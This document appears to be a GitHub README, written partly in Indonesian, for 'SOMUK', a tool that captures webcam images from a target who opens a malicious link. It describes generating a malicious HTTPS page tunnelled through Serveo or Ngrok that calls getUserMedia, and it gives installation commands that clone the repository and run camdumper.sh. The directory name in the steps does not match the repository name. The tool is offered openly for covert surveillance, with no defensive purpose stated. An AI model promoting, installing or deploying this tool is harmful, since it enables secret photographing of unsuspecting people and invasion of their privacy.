<h1 align="center">SOMUK</h1>
<p align="center"><img src="Somuk.jpg" max-width="90%%" height="auto"></p>
<p align="center">Take webcam shots from target by just sending a malicious link</p>

Bagaimana cara kerjanya?
Alat ini menghasilkan halaman HTTPS berbahaya menggunakan metode Serveo atau Ngrok Port Forwarding, 
dan kode JavaScript untuk memproses permintaan menggunakan MediaDevices.getUserMedia.

Metode MediaDevices.getUserMedia() meminta izin kepada pengguna untuk menggunakan input media yang menghasilkan MediaStream dengan trek yang berisi jenis media yang diminta. 
Aliran tersebut dapat mencakup, misalnya, trek video (diproduksi oleh perangkat keras atau sumber video virtual seperti kamera, perangkat perekam video, layanan berbagi layar, dan sebagainya), 
trek audio (juga, diproduksi oleh sumber audio fisik atau virtual seperti mikrofon, konverter A/D, atau sejenisnya), dan mungkin jenis trek lainnya.
Lihat selengkapnya tentang MediaDEvices.getUserMedia() di sini

Instalasi (Kali Linux/Termux):
$ apt update && apt upgrade
$ apt install git php wget curl jq
$ git clone https://github.com/Readone99/Somuk
$ cd CAM-DUMPER
$ chmod +x camdumper.sh
$ ./camdumper.sh
Pengguna Termux disarankan untuk menginstal aplikasi MATERIAL FILES dari Playstore agar mudah mengelola file yang ditangkap.

Selamat mencoba :]
